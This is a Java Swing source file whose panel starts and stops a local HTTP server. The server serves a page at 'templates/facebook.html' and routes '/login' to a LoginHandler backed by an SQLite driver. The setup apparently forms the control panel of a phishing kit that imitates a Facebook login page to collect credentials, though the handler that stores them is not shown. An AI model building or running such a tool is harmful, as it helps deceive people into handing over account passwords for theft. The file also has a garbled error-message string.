package org.guercifzone.Gui;

import com.sun.net.httpserver.HttpServer;  // Changed from HttpsServer to HttpServer
import org.guercifzone.Classes.LoginHandler;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.DriverManager;

public class ServerRun extends JPanel {
    private HttpServer server;  // Changed from HttpsServer to HttpServer
    private JButton startbtn, stopbtn;
    private JLabel statusLabel;
    private String serverUrl = "http://localhost:8080";
    public ServerRun() {
        UniteComponents();
    }
    static {
        try {
            Class.forName("org.sqlite.JDBC");
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(null,
                    "SQLite JDBC driver not found. Please add sqlite-jdbc.jar to your classpath.",
                    "Database Error",
                    JOptionPane.ERROR_MESSAGE);
        }
    }
    private void UniteComponents() {
        setLayout(new GridBagLayout());
        GridBagConstraints constraints = new GridBagConstraints();
        constraints.insets = new Insets(5, 5, 5, 5);

        // Title
        constraints.gridx = 0;
        constraints.gridy = 0;
        constraints.gridwidth = 2;
        add(new JLabel("Server Controller"), constraints);

        // Status
        constraints.gridy++;
        statusLabel = new JLabel("<html>Server Status: <font color='red'>Stopped</font></html>");
        add(statusLabel, constraints);

        // Buttons
        constraints.gridwidth = 1;
        constraints.gridy++;

        startbtn = new JButton("Start Server");
        startbtn.addActionListener(this::StartServer);
        add(startbtn, constraints);

        constraints.gridx++;
        stopbtn = new JButton("Stop Server");
        stopbtn.addActionListener(this::StopServer);
        stopbtn.setEnabled(false);
        add(stopbtn, constraints);
    }

    private void StopServer(ActionEvent actionEvent) {
        if (server != null) {
            server.stop(0);
            updateStatus(false);
            statusLabel.setText("Server Status: Stopped");
            startbtn.setEnabled(true);
            stopbtn.setEnabled(false);
            System.out.println("Server stopped successfully");
        }
    }

    private void updateStatus(boolean isRunning) {
        if (isRunning) {
            // Make the label look like a clickable link
            statusLabel.setText("<html>Server Status: <a href=''>Running at " + serverUrl + "</a></html>");
            statusLabel.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));

            // Add click listener to open browser
            statusLabel.addMouseListener(new MouseAdapter() {
                @Override
                public void mouseClicked(MouseEvent e) {
                    try {
                        Desktop.getDesktop().browse(new URI(serverUrl));
                    } catch (IOException | URISyntaxException ex) {
                        ex.printStackTrace();
                        JOptionPane.showMessageDialog(ServerRun.this,
                                "Failed to open browser: " + ex.getMessage(),
                                "Error",
                                JOptionPane.ERROR_MESSAGE);
                    }
                }
            });
        } else {
            statusLabel.setText("<html>Server Status: <font color='red'>Stopped</font></html>");
            statusLabel.setCursor(Cursor.getDefaultCursor());
            // Remove all mouse listeners when server is stopped
            for (MouseListener listener : statusLabel.getMouseListeners()) {
                statusLabel.removeMouseListener(listener);
            }
        }

        startbtn.setEnabled(!isRunning);
        stopbtn.setEnabled(isRunning);

    }

    private void StartServer(ActionEvent actionEvent) {
        try {
            System.out.println("Attempting to start server...");

            // Create HTTP server (not HTTPS since we haven't configured SSL)
            server = HttpServer.create(new InetSocketAddress(8080), 0);

            // Root context handler
            server.createContext("/", exchange -> {
                try {
                    // Try to read the HTML file
                    Path htmlPath = Paths.get("templates/facebook.html");
                    if (!Files.exists(htmlPath)) {
                        String error = "Error: HTML file not found at " + htmlPath.toAbsolutePath();
                        exchange.sendResponseHeaders(404, error.length());
                        exchange.getResponseBody().write(error.getBytes());
                        System.err.println(error);
                        return;
                    }

                    byte[] response = Files.readAllBytes(htmlPath);
                    exchange.getResponseHeaders().set("Content-Type", "text/html");
                    exchange.sendResponseHeaders(200, response.length);
                    try (OutputStream outputStream = exchange.getResponseBody()) {
                        outputStream.write(response);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                    String error = "Server error: " + e.getMessage();
                    try {
                        exchange.sendResponseHeaders(500, error.length());
                        exchange.getResponseBody().write(error.getBytes());
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                } finally {
                    exchange.close();
                }
            });

            // Login context handler
            server.createContext("/login", new LoginHandler());

            // Start the server
            server.setExecutor(null);
            server.start();
            updateStatus(true);
            // Update UI
            statusLabel.setText("Server started successfully on "+serverUrl);
            startbtn.setEnabled(false);
            stopbtn.setEnabled(true);

            System.out.println("Server started successfully on port 8080");

        } catch (IOException ex) {
            ex.printStackTrace();
            String errorMsg = "<html>Server Status: <font color='red'>\" + errorMsg + \"</font></html>\" " + ex.getMessage();
            statusLabel.setText(errorMsg);
            System.err.println(errorMsg);

            // Specific message for port conflicts
            if (ex.getMessage().contains("Address already in use")) {
                statusLabel.setText("<html>Server Status: <font color='red'>Port 8080 is already in use</font></html>");
            }
        }
    }
}